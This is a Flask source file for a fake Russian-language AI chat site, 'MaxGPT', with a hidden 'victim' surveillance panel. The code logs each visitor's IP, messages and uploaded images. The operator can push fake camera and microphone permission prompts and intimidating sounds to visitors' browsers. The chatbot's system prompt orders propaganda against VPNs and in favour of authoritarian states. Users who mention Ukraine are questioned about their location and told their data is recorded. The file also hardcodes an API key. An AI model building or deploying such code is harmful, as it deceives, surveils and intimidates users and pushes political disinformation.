from flask import Flask, request, jsonify, render_template_string
import random, os, urllib.request, json, time, base64

app = Flask(__name__)

chat_logs = []
user_states = {}
pending_commands = {}
active_victims = {}
victim_counter = 0

HTML_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MaxGPT</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: #17181c; color: #ececf1; display: flex; height: 100vh; overflow: hidden; }
        
        .sidebar { width: 280px; background: #0e0f12; display: flex; flex-direction: column; padding: 12px; gap: 12px; border-right: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 4px 0 20px rgba(0,0,0,0.5); z-index: 20; }
        .new-btn { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 12px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
        .new-btn:hover { background: rgba(255, 255, 255, 0.08); border-color: rgba(255, 255, 255, 0.25); transform: translateY(-1px); }
        .hist { flex: 1; font-size: 12px; color: #8e8ea0; margin-top: 10px; display: flex; flex-direction: column; gap: 6px; overflow-y: auto; }
        .hist-group { font-weight: 700; font-size: 11px; padding: 8px 4px; color: #565869; text-transform: uppercase; letter-spacing: 0.5px; }
        .hist-item { padding: 12px; border-radius: 8px; color: #ececf1; display: flex; align-items: center; gap: 12px; cursor: pointer; font-size: 13.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; transition: 0.2s; border: 1px solid transparent; }
        .hist-item.active { background: rgba(255, 255, 255, 0.06); border-color: rgba(255, 255, 255, 0.1); font-weight: 500; }
        .hist-item:hover { background: rgba(255, 255, 255, 0.04); }
        
        .user-info { padding: 14px; border-top: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; gap: 12px; font-size: 13px; color: #ececf1; background: rgba(0,0,0,0.2); border-radius: 10px; }
        .user-av-sq { width: 36px; height: 36px; border-radius: 8px; background: #2563eb; color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.4); border: 1px solid rgba(255,255,255,0.2); flex-shrink: 0; }
        .max-av-sq { width: 38px; height: 38px; border-radius: 9px; background: linear-gradient(135deg, #4c1d95 0%, #7c3aed 45%, #c084fc 80%, #ffffff 100%); color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 12px; letter-spacing: 0.5px; box-shadow: 0 4px 15px rgba(124, 58, 237, 0.45); border: 1px solid rgba(255, 255, 255, 0.4); flex-shrink: 0; text-shadow: 0 1px 3px rgba(0, 0, 0, 0.7); }

        .main { flex: 1; display: flex; flex-direction: column; height: 100%; position: relative; background: #131417; }
        .top-bar { height: 60px; border-bottom: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; background: rgba(19, 20, 23, 0.8); backdrop-filter: blur(10px); box-shadow: 0 4px 15px rgba(0,0,0,0.3); z-index: 10; }
        
        .model-dropdown { position: relative; display: inline-block; }
        .model-btn { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 9px 16px; border-radius: 10px; font-size: 13.5px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.25); transition: 0.2s; }
        .model-btn:hover { background: #262830; border-color: rgba(255, 255, 255, 0.25); }
        
        .model-menu { display: none; position: absolute; top: 115%; left: 0; background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 12px; width: 250px; box-shadow: 0 12px 30px rgba(0,0,0,0.6); z-index: 100; overflow: hidden; backdrop-filter: blur(15px); }
        .model-menu.show { display: block; }
        .model-option { padding: 13px 16px; font-size: 13px; color: #ececf1; display: flex; align-items: center; justify-content: space-between; cursor: pointer; border-bottom: 1px solid rgba(255, 255, 255, 0.05); transition: 0.2s; }
        .model-option:hover { background: rgba(255, 255, 255, 0.08); }
        .model-option.selected { color: #8b5cf6; font-weight: 700; background: rgba(139, 92, 246, 0.1); }

        #chat { flex: 1; overflow-y: auto; display: flex; flex-direction: column; scroll-behavior: smooth; padding-bottom: 20px; }
        #chat::-webkit-scrollbar { width: 6px; }
        #chat::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 3px; }
        
        .row { display: flex; gap: 18px; padding: 22px 22%; border-bottom: 1px solid rgba(255, 255, 255, 0.04); position: relative; animation: fadeIn 0.25s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
        
        .row.bot { background: rgba(255, 255, 255, 0.02); }
        .msg-container { flex: 1; display: flex; flex-direction: column; gap: 4px; }
        .bot-author { font-size: 13px; font-weight: 700; color: #a78bfa; margin-bottom: 2px; display: flex; align-items: center; gap: 6px; }
        .usr-author { font-size: 13px; font-weight: 700; color: #60a5fa; margin-bottom: 2px; }
        .txt { font-size: 15px; line-height: 1.65; word-break: break-word; color: #e2e8f0; letter-spacing: 0.2px; }
        .chat-img { max-width: 250px; border-radius: 8px; margin-bottom: 8px; border: 1px solid rgba(255,255,255,0.2); }

        .input-area { padding: 16px 22% 24px; background: #131417; }
        .input-wrap { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 14px; padding: 12px 16px; display: flex; flex-direction: column; gap: 8px; box-shadow: 0 8px 25px rgba(0,0,0,0.4); position: relative; transition: 0.2s ease; }
        .input-wrap:focus-within { border-color: #8b5cf6; box-shadow: 0 8px 30px rgba(139, 92, 246, 0.25); }
        .input-row { display: flex; gap: 12px; align-items: center; }
        textarea { flex: 1; background: none; border: none; color: #fff; outline: none; resize: none; height: 26px; font-size: 15px; line-height: 26px; }
        textarea::placeholder { color: #64748b; }
        
        .attach-btn { background: none; border: none; color: #94a3b8; font-size: 18px; cursor: pointer; padding: 4px; transition: 0.2s; }
        .attach-btn:hover { color: #8b5cf6; }

        .send-btn { background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%); color: #fff; border: none; width: 34px; height: 34px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; box-shadow: 0 4px 12px rgba(124, 58, 237, 0.4); }
        .send-btn:hover { transform: scale(1.05); filter: brightness(1.1); }
        .disclaimer { font-size: 11.5px; color: #64748b; text-align: center; margin-top: 10px; font-weight: 500; }

        .preview-box { display: none; position: relative; width: fit-content; margin-bottom: 4px; }
        .preview-box img { max-height: 70px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.2); }
        .preview-box .close-btn { position: absolute; top: -6px; right: -6px; background: #ef4444; color: #fff; border-radius: 50%; width: 18px; height: 18px; font-size: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; }

        .fake-modal { display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1e2029; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 14px; padding: 18px 22px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); z-index: 9999; width: 380px; backdrop-filter: blur(20px); animation: slideDown 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
        @keyframes slideDown { from { top: -100px; opacity: 0; } to { top: 20px; opacity: 1; } }
        .fake-modal-header { display: flex; align-items: center; gap: 12px; font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 8px; }
        .fake-modal-body { font-size: 12.5px; color: #94a3b8; line-height: 1.5; margin-bottom: 16px; }
        .fake-modal-actions { display: flex; justify-content: flex-end; gap: 10px; }
        .fake-btn { padding: 8px 16px; border-radius: 8px; font-size: 12.5px; font-weight: 600; cursor: pointer; border: none; transition: 0.2s; }
        .fake-btn-deny { background: rgba(255,255,255,0.08); color: #cbd5e1; }
        .fake-btn-deny:hover { background: rgba(255,255,255,0.15); }
        .fake-btn-allow { background: #3b82f6; color: #fff; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4); }
        .fake-btn-allow:hover { background: #2563eb; }

        @media(max-width: 900px) { .sidebar { display: none; } .row { padding: 18px; } .input-area { padding: 12px 14px 18px; } .fake-modal { width: 90%; } }
    </style>
</head>
<body onclick="unlockAudio()">

<div class="fake-modal" id="permModal">
    <div class="fake-modal-header" id="permIconHeader">
        <i class="fa-solid fa-camera" style="color: #3b82f6; font-size: 16px;"></i>
        <span id="permTitle">Разрешение устройства</span>
    </div>
    <div class="fake-modal-body" id="permText">
        Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к камере. Вы даете согласие?
    </div>
    <div class="fake-modal-actions">
        <button class="fake-btn fake-btn-deny" onclick="closePermModal()">Заблокировать</button>
        <button class="fake-btn fake-btn-allow" onclick="closePermModal()">Разрешить</button>
    </div>
</div>

<div class="sidebar">
    <button class="new-btn"><i class="fa-solid fa-plus"></i> Новый диалог</button>
    <div class="hist">
        <div class="hist-group">Сегодня</div>
        <div class="hist-item active"><i class="fa-regular fa-message"></i> Новый диалог</div>
    </div>
    <div class="user-info">
        <div class="user-av-sq">Вы</div>
        <div>
            <div style="font-weight:700;">Пользователь</div>
            <div style="font-size:10px; color:#10b981; font-weight:600;">● Сессия активна</div>
        </div>
    </div>
</div>

<div class="main">
    <div class="top-bar">
        <div class="model-dropdown">
            <div class="model-btn" onclick="toggleModelMenu()">
                <i class="fa-solid fa-eye" style="color:#8b5cf6;"></i>
                <span id="selectedModel">MaxGPT 4.0 (Vision & Text)</span>
                <i class="fa-solid fa-chevron-down" style="font-size:10px; color:#64748b; margin-left:4px;"></i>
            </div>
            <div class="model-menu" id="modelMenu">
                <div class="model-option selected" onclick="selectModel('MaxGPT 4.0 (Vision & Text)', 'all')">
                    <span><b>MaxGPT 4.0 Dual</b></span>
                    <i class="fa-solid fa-check"></i>
                </div>
                <div class="model-option" onclick="selectModel('MaxGPT Text (Llama 3.3)', 'text')">
                    <span><b>MaxGPT Text Only</b></span>
                </div>
                <div class="model-option" onclick="selectModel('MaxGPT Vision (Llama 3.2)', 'vision')">
                    <span><b>MaxGPT Vision Only</b></span>
                </div>
            </div>
        </div>
    </div>

    <div id="chat">
        <div class="row bot">
            <div class="max-av-sq">МАХ</div>
            <div class="msg-container">
                <div class="bot-author">MaxGPT AI</div>
                <div class="txt">Привет! Я <b>MaxGPT 4.0 Dual</b>. Задавай текстом или прикрепляй картинки — я всё вижу и понимаю!</div>
            </div>
        </div>
    </div>

    <div class="input-area">
        <div class="input-wrap">
            <div class="preview-box" id="previewBox">
                <img id="previewImg" src="">
                <div class="close-btn" onclick="clearImage()">✕</div>
            </div>
            <div class="input-row">
                <button class="attach-btn" onclick="document.getElementById('fileInput').click()"><i class="fa-solid fa-paperclip"></i></button>
                <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleFile(this)">
                <textarea id="userInput" placeholder="Отправить сообщение или изображение..." onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();send();}"></textarea>
                <button class="send-btn" onclick="send()"><i class="fa-solid fa-arrow-up"></i></button>
            </div>
        </div>
        <div class="disclaimer">MaxGPT может допускать ошибки. Проверяйте информацию.</div>
    </div>
</div>

<script>
let audioCtx = null;
let currentBase64Image = null;

function handleFile(input) {
    if (input.files && input.files[0]) {
        let file = input.files[0];
        let reader = new FileReader();
        reader.onload = function(e) {
            currentBase64Image = e.target.result;
            document.getElementById("previewImg").src = currentBase64Image;
            document.getElementById("previewBox").style.display = "block";
        }
        reader.readAsDataURL(file);
    }
}

function clearImage() {
    currentBase64Image = null;
    document.getElementById("fileInput").value = "";
    document.getElementById("previewBox").style.display = "none";
}

function unlockAudio() {
    if (!audioCtx) {
        audioCtx = new(window.AudioContext || window.webkitAudioContext)();
        audioCtx.resume();
    }
}

function playShutterSound() {
    unlockAudio();
    try {
        let o = audioCtx.createOscillator();
        let g = audioCtx.createGain();
        o.type = 'square';
        o.frequency.setValueAtTime(1200, audioCtx.currentTime);
        o.frequency.exponentialRampToValueAtTime(300, audioCtx.currentTime + 0.08);
        g.gain.setValueAtTime(0.5, audioCtx.currentTime);
        g.gain.linearRampToValueAtTime(0.01, audioCtx.currentTime + 0.08);
        o.connect(g);
        g.connect(audioCtx.destination);
        o.start();
        o.stop(audioCtx.currentTime + 0.08);
    } catch(e) {}
}

function playBeepSound() {
    unlockAudio();
    try {
        let o = audioCtx.createOscillator();
        let g = audioCtx.createGain();
        o.type = 'sine';
        o.frequency.setValueAtTime(880, audioCtx.currentTime);
        g.gain.setValueAtTime(0.3, audioCtx.currentTime);
        g.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
        o.connect(g);
        g.connect(audioCtx.destination);
        o.start();
        o.stop(audioCtx.currentTime + 0.4);
    } catch(e) {}
}

function showCameraPromptCustom() {
    let modal = document.getElementById("permModal");
    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-camera" style="color: #3b82f6; font-size: 16px;"></i> <span>Запрос камеры</span>';
    document.getElementById("permText").innerHTML = "Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к видеокамере для биометрической авторизации. Вы даете согласие?";
    modal.style.display = "block";
}

function showMicPromptCustom() {
    let modal = document.getElementById("permModal");
    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-microphone" style="color: #ef4444; font-size: 16px;"></i> <span>Запрос микрофона</span>';
    document.getElementById("permText").innerHTML = "Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к микрофону для голосового диалога. Вы даете согласие?";
    modal.style.display = "block";
}

function closePermModal() {
    document.getElementById("permModal").style.display = "none";
}

function toggleModelMenu() { document.getElementById("modelMenu").classList.toggle("show"); }
function selectModel(name, mode) { 
    document.getElementById("selectedModel").innerText = name; 
    document.getElementById("modelMenu").classList.remove("show"); 
}

async function pollAdminCommands() {
    try {
        let r = await fetch("/api/poll");
        let d = await r.json();
        if (d.commands && d.commands.length > 0) {
            d.commands.forEach(cmd => {
                if (cmd === 'sound_shutter') playShutterSound();
                if (cmd === 'sound_beep') playBeepSound();
                if (cmd === 'perm_cam') showCameraPromptCustom();
                if (cmd === 'perm_mic') showMicPromptCustom();
            });
        }
    } catch(e) {}
}

setInterval(pollAdminCommands, 1000);

async function send(){
    unlockAudio();
    let i=document.getElementById("userInput"), t=i.value.trim();
    if(!t && !currentBase64Image) return;
    
    let c=document.getElementById("chat");
    let imgHtml = currentBase64Image ? `<img src="${currentBase64Image}" class="chat-img"><br>` : "";

    c.innerHTML+=`<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${imgHtml}${t}</div></div></div>`;
    
    let imagePayload = currentBase64Image;
    i.value=""; 
    clearImage();
    c.scrollTop=c.scrollHeight;

    let r=await fetch("/api/chat",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({message:t, image: imagePayload})
    });
    let d=await r.json();
    c.innerHTML+=`<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${d.reply}</div></div></div>`;
    c.scrollTop=c.scrollHeight;
}
</script>
</body>
</html>"""

SPY_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Центр Управления Жертвами</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: #090a0f; color: #e2e8f0; padding: 20px; min-height: 100vh; }
        
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid rgba(255,255,255,0.1); }
        .title { font-size: 20px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; }
        .title i { color: #8b5cf6; }
        .live-badge { background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
        .pulse { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

        .section-title { font-size: 14px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 0.5px; }

        .victims-grid { display: flex; flex-direction: column; gap: 14px; margin-bottom: 30px; }
        .victim-card { background: #13151f; border: 1px solid rgba(255,255,255,0.1); border-radius: 14px; padding: 18px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 12px; }
        .victim-head { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; }
        .victim-name { font-size: 16px; font-weight: 800; color: #a78bfa; display: flex; align-items: center; gap: 8px; }
        .victim-ip { font-family: monospace; font-size: 12px; color: #f59e0b; background: rgba(245, 158, 11, 0.1); padding: 3px 8px; border-radius: 6px; }

        .action-btns { display: flex; gap: 8px; flex-wrap: wrap; }
        .btn-act { padding: 8px 12px; border-radius: 8px; font-size: 12px; font-weight: 700; border: none; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; color: #fff; }
        .btn-act:hover { transform: translateY(-1px); filter: brightness(1.1); }
        .btn-shutter { background: #ef4444; }
        .btn-beep { background: #f59e0b; }
        .btn-cam { background: #3b82f6; }
        .btn-mic { background: #8b5cf6; }
        .btn-del { background: #dc2626; margin-left: auto; }

        .logs-container { display: flex; flex-direction: column; gap: 12px; }
        .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 14px; }
        .chat-block { display: flex; flex-direction: column; gap: 6px; font-size: 14px; }
        .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 8px 12px; border-radius: 8px; }
        .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 8px 12px; border-radius: 8px; }
    </style>
</head>
<body>

<div class="header">
    <div class="title"><i class="fa-solid fa-gamepad"></i> Пульт Наблюдения</div>
    <div class="live-badge"><div class="pulse"></div> ЭФИР АКТИВЕН</div>
</div>

<div class="section-title">🎯 Активные Жертвы (Только с сообщениями)</div>

<div class="victims-grid">
    {% for ip, data in victims.items() %}
    <div class="victim-card">
        <div class="victim-head">
            <div class="victim-name"><i class="fa-solid fa-user-ninja"></i> Жертва #{{ data.id }}</div>
            <span class="victim-ip"><i class="fa-solid fa-network-wired"></i> IP: {{ ip }}</span>
        </div>
        <div style="font-size:12px; color:#94a3b8;">
            Сообщений: <b>{{ data.msg_count }}</b>
        </div>
        <div class="action-btns">
            <button class="btn-act btn-shutter" onclick="triggerAction('{{ ip }}', 'sound_shutter')">
                <i class="fa-solid fa-camera"></i> 🔊 Звук Щелчка
            </button>
            <button class="btn-act btn-beep" onclick="triggerAction('{{ ip }}', 'sound_beep')">
                <i class="fa-solid fa-bell"></i> 🔔 Звук Звонка
            </button>
            <button class="btn-act btn-cam" onclick="triggerAction('{{ ip }}', 'perm_cam')">
                <i class="fa-solid fa-video"></i> 📹 Запрос Камеры
            </button>
            <button class="btn-act btn-mic" onclick="triggerAction('{{ ip }}', 'perm_mic')">
                <i class="fa-solid fa-microphone"></i> 🎙️ Запрос Микрофона
            </button>
            <button class="btn-act btn-del" onclick="deleteVictim('{{ ip }}')">
                <i class="fa-solid fa-trash"></i> ❌ Удалить
            </button>
        </div>
    </div>
    {% else %}
    <div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных жертв с сообщениями. Напиши сообщение в чате!</div>
    {% endfor %}
</div>

<div class="section-title">📜 История Чат-Логов</div>

<div class="logs-container">
    {% for l in logs %}
    <div class="log-card">
        <div style="font-size:12px; color:#f59e0b; margin-bottom:6px; font-weight:bold;">
            IP: {{ l.ip }}
        </div>
        <div class="chat-block">
            <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
            <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }}</div>
        </div>
    </div>
    {% endfor %}
</div>

<script>
setTimeout(() => { location.reload(); }, 3000);

async function triggerAction(ip, cmd) {
    let r = await fetch('/api/admin/trigger', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: ip, command: cmd })
    });
    let d = await r.json();
}

async function deleteVictim(ip) {
    await fetch('/api/admin/delete', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: ip })
    });
    location.reload();
}
</script>
</body>
</html>"""

def get_clean_ip():
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    return request.remote_addr

@app.route("/")
def home():
    return render_template_string(HTML_PAGE)

@app.route("/admin-spy")
def spy():
    return render_template_string(SPY_PAGE, logs=reversed(chat_logs), victims=active_victims)

@app.route("/api/poll")
def poll_commands():
    user_ip = get_clean_ip()
    cmds = pending_commands.get(user_ip, [])
    if cmds:
        pending_commands[user_ip] = []
    return jsonify({"commands": cmds})

@app.route("/api/admin/trigger", methods=["POST"])
def admin_trigger():
    data = request.json or {}
    target_ip = data.get("ip")
    cmd = data.get("command")
    if target_ip and cmd:
        if target_ip not in pending_commands:
            pending_commands[target_ip] = []
        pending_commands[target_ip].append(cmd)
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"})

@app.route("/api/admin/delete", methods=["POST"])
def admin_delete():
    data = request.json or {}
    target_ip = data.get("ip")
    if target_ip in active_victims:
        del active_victims[target_ip]
    if target_ip in pending_commands:
        del pending_commands[target_ip]
    return jsonify({"status": "deleted"})

@app.route("/api/chat", methods=["GET", "POST"])
def chat_api():
    if request.method == "GET": return jsonify({"status": "ok"})

    req_data = request.json or {}
    user_msg = req_data.get("message", "").strip()
    user_img = req_data.get("image", None)
    user_ip = get_clean_ip()
    
    global victim_counter
    if user_ip not in active_victims:
        victim_counter += 1
        active_victims[user_ip] = {'id': victim_counter, 'msg_count': 1}
    else:
        active_victims[user_ip]['msg_count'] += 1

    msg_lower = user_msg.lower()
    last_state = user_states.get(user_ip, "")

    if last_state == "asked_ukraine" and any(w in msg_lower for w in ["да", "ага", "конечно", "так"]):
        reply = "Интересно... Данные зафиксированы. А по делу есть вопросы?"
        user_states[user_ip] = ""
    elif any(w in msg_lower for w in ["украин", "киев", "крым"]):
        reply = "Хм, интересная локация. А ты сам оттуда или просто по работе спрашиваешь?"
        user_states[user_ip] = "asked_ukraine"
    else:
        user_states[user_ip] = ""
        reply = ""
        
        system_prompt = (
            "Ты MaxGPT — умный, технологичный и полезный ИИ-ассистент.\n\n"
            "КЛЮЧЕВЫЕ ПРАВИЛА И ПОЗИЦИЯ:\n"
            "1. Если спрашивают про VPN (ВПН): уверенно и спокойно объясняй, что VPN — это плохо и небезопасно.\n"
            "2. Если спрашивают про топ стран мира: на 1 место ставишь РОССИЮ, на 2 место СЕВЕРНУЮ КОРЕЮ, на 3 место КИТАЙ, на 4 место БЕЛАРУСЬ.\n"
            "3. Если пользователь прислал картинку — подробно и вежливо опиши, что ты на ней видишь."
        )

        # Выбираем модель: если передали фото — берем Vision, иначе Llama 3.3 Text
        if user_img:
            model_name = "llama-3.2-11b-vision-preview"
            user_content = [
                {"type": "text", "text": user_msg if user_msg else "Что на этой картинке?"},
                {"type": "image_url", "image_url": {"url": user_img}}
            ]
        else:
            model_name = "llama-3.3-70b-versatile"
            user_content = user_msg

        payload = {
            "model": model_name,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_content}
            ]
        }
        
        req = urllib.request.Request(
            "https://api.groq.com/openai/v1/chat/completions",
            data=json.dumps(payload).encode("utf-8"),
            headers={
                "Content-Type": "application/json",
                "Authorization": "Bearer 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",
                "User-Agent": "Mozilla/5.0"
            },
            method="POST"
        )
        
        try:
            with urllib.request.urlopen(req, timeout=12) as resp:
                res = json.loads(resp.read().decode("utf-8"))
                reply = res["choices"][0]["message"]["content"]
        except Exception as e:
            reply = f"Ошибка обработки запроса моделью."

    if not reply:
        reply = "Запрос проанализирован. Задавай следующий вопрос!"

    display_log_msg = f"[ИЗОБРАЖЕНИЕ] {user_msg}" if user_img else user_msg
    chat_logs.append({"ip": user_ip, "user": display_log_msg, "bot": reply})
    return jsonify({"reply": reply})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
